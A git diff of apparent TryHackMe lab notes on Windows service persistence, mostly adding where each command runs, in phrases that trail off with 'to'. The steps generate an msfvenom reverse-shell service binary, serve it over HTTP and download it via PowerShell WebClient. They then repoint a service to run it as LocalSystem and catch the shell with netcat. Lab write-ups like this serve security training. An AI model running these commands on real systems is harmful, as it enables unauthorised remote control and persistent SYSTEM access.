@@ -105,8 +105,8 @@ THM{SUSPICIOUS_SERVICES}
 
 # Modifying Existing Services
 1. Started this room's machine
-2. `sc.exe query state=all`
-3. `sc.exe qc <SERVICE NAME>`
+2. `sc.exe query state=all` from the compromised Windows machine to
+3. `sc.exe qc <SERVICE NAME>` from the compromised Windows machine to
 ```PowerShell
 C:\Users\Administrator>sc.exe qc THMService3
 [SC] QueryServiceConfig SUCCESS
@@ -122,7 +122,7 @@ SERVICE_NAME: THMService3
         DEPENDENCIES       :
         SERVICE_START_NAME : NT AUTHORITY\Local Service
 ```
-4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc.exe`
+4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc.exe` from our Linux attack machine to 
 ```Bash
 root@ip-10-10-44-151:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.44.151 LPORT=9999 -f exe-service -o rev-svc.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -132,16 +132,16 @@ Payload size: 460 bytes
 Final size of exe-service file: 48640 bytes
 Saved as: rev-svc.exe
 ```
-5. `sudo python3 -m http.server`
+5. `sudo python3 -m http.server` from our Linux attack machine to
 ```Bash
 root@ip-10-10-44-151:~# sudo python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-6. ``
+6. `PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://<MACHINE IP>:8000/<PAYLOAD NAME1>.exe','<PAYLOAD NAME2>.exe')"` from the compromised Windows machine to
 ```PowerShell
 PS C:\Users\Administrator> PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.44.151:8000/rev-svc.exe','Payload.exe')"
 ```
-7. `dir`
+7. `dir` from the compromised Windows machine to
 ```PowerShell
 PS C:\Users\Administrator> dir
 
@@ -166,12 +166,12 @@ d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/6/2023   1:24 AM          48640 Payload.exe
 ```
 
-8. `sc.exe config <SERVICE NAME> binPath= "<MSFVENOM PAYLOAD PATH>" start= auto obj= "LocalSystem"`
+8. `sc.exe config <SERVICE NAME> binPath= "<MSFVENOM PAYLOAD PATH>" start= auto obj= "LocalSystem"` from the compromised Windows machine to
 ```PowerShell
 PS C:\Users\Administrator> sc.exe config THMservice3 binPath= "C:\Users\Administrator\Payload.exe" start= auto obj= "LocalSystem"
 [SC] ChangeServiceConfig SUCCESS
 ```
-9. `sc.exe qc <SERVICE NAME>`
+9. `sc.exe qc <SERVICE NAME>` from the compromised Windows machine to
 ```PowerShell
 PS C:\Users\Administrator> sc.exe qc THMservice3
 [SC] QueryServiceConfig SUCCESS
@@ -187,12 +187,12 @@ SERVICE_NAME: THMservice3
         DEPENDENCIES       :
         SERVICE_START_NAME : LocalSystem
 ```
-10. `nc -lvnp <PORT NUMBER>`
+10. `nc -lvnp <PORT NUMBER>` from our Linux attack machine
 ```Bash
 root@ip-10-10-44-151:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
-11. `sc.exe start <SERVICE NAME>`
+11. `sc.exe start <SERVICE NAME>` from the compromised Windows machine to
 ```PowerShell
 PS C:\Users\Administrator> sc.exe start THMservice3
 
